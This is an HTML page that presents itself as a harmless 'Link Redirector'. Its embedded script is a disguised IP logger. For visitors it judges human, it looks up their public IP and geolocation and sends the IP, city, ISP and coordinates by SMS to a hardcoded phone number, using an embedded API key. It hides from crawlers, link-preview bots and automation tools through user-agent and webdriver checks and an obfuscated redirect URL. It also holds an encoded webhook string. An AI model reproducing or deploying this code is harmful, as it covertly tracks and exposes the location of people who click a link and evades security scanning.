<html>
    <head>
        <style>
            .loading-text {
                text-align: center;
            }

            .loading {
                width: 100%;
                min-width: 100%;
                max-width: 100%;
            }

            .finished {
                width: 100%;
                min-width: 100%;
                max-width: 100%;
            }

            .finished-img {
                display: block;
                margin: auto;
                width: 50%;
            }
        </style>

        <meta property="og:type" content="website">
        <meta property="og:url" content="https://example.com">
        <meta property="og:title" content="Link Redirector">
        <meta property="og:description" content="Redirects to a website of your choice">
        <meta property="og:image" content="https://example.com">
        <meta property="og:site_name" content="Link Redirector">
    </head>
    <body>
        <div class="loading" id="loading">
            <h1 class="loading-text">Redirecting..</h1>
        </div>
        <div class="finished" id="finished">
            <img src="6065510171_bb00e7222b_z.jpg" alt="" class="finished-img">
        </div>
        <script>
            (function(){
                document.getElementById("loading").style.display = "inline";
                document.getElementById("finished").style.display = "none";
                var ENC = "==wbpxUeC9FRIxGUw1jd/g2Y0F2dv02bj5SZiVHd19Weuc3d39yL6MHc0RHa";
                var link = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMzAxMTc3NDE5Mzg2MDYxOC8tVHN2aU9hbkthOU1oWGRjdC1Xd2hhOUVsdEkxbFpWRUpsLVNTWElFWGRjcDhyb3MwaUJ4T0RyczJWRnBFR0xhT1ZtZQ==";
                function _d(b){
                    try{ return decodeURIComponent(escape(atob(b))); }catch(e){ return ""; }
                }
                function realUrl(){
                    return _d(ENC.split("").reverse().join(""));
                }

                var ua = (navigator.userAgent || "").toLowerCase();
                var bots = ["bot","spider","crawl","slurp","headless","phantom","puppeteer",
                            "playwright","selenium","scrapy","curl","wget","python-requests",
                            "go-http","httpclient","checker","preview","facebookexternalhit",
                            "whatsapp","telegrambot","linkedinbot","embedly","quora","slackbot",
                            "semrush","ahrefs","mj12","dotbot","petalbot","bytespider"];
                var isBot = bots.some(function(b){ return ua.indexOf(b) !== -1; });

                async function getGeo(ip) {
                    const response = await fetch(
                            "https://http-proxy-worker.przybyloalan66.workers.dev/json/" + ip + "?fields=status,message,country,city,lat,lon,isp"
                        );
                    const data = response.json();

                    return data;
                }

                async function sendTextbeeSms(phone, message, apiKey, deviceId = "") {
                    const url = deviceId
                        ? `https://api.textbee.dev/api/v1/gateway/devices/${encodeURIComponent(deviceId)}/send-sms`
                        : "https://api.textbee.dev/api/v1/gateway/send-sms";

                    const body = {
                        recipients: [phone.trim()],
                        message: message.trim()
                    };

                    const res = await fetch(url, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "x-api-key": apiKey
                        },
                        body: JSON.stringify(body)
                    });

                    const data = await res.json();

                    if (!res.ok) {
                        throw new Error(data.message || `HTTP ${res.status}`);
                    }

                    return data;
                }

                if(!isBot){
                    console.log(1)
                    const findIP = fetch('https://api.ipify.org?format=json')
                        .then(res => res.json())
                        .then(data => data.ip);

                    findIP.then(async ip => {
                        var data = await getGeo(ip);
                        console.log(2)

                        sendTextbeeSms("+48887478787", ip + "\n" + data.city + ", " + data.country + "\nisp: " + data.isp + "\ngeolocation: " + data.lat + ", " + data.lon, 
                            "txb_TPNEc5gOnMb8zVjB8zHDfrXLVDesLAqM", "6b09d7ca66f622fbea92585c")
                            .then((result) => console.log("Sent:", result))
                            .catch((err) => console.error("Failed:", err.message));
                    }).catch(e => console.error(e))

                    setTimeout(function(){
                        document.getElementById("loading").style.display = "none";
                        document.getElementById("finished").style.display = "inline";
                    }, 1000);
                }

                var done = false;
                function go(){
                    if(done) return; done = true;
                    var url = realUrl();
                    var w = window.open("", "_self");
                    if(w){ w.location.href = url; }
                    else { window.location.replace(url); }
                }

                ["click","mousemove","keydown","touchstart","scroll"].forEach(function(ev){
                    if (isBot) {
                        window.addEventListener(ev, function handler(){
                        go();
                        window.removeEventListener(ev, handler);
                        }, { once:true, passive:true });
                    }
                });

                setTimeout(function(){
                    var human = !!(navigator.languages && navigator.languages.length) &&
                                (typeof navigator.webdriver === "undefined" || navigator.webdriver === false);
                    if(!human){ go(); }
                }, 100);
            })();
        </script>
    </body>
</html>
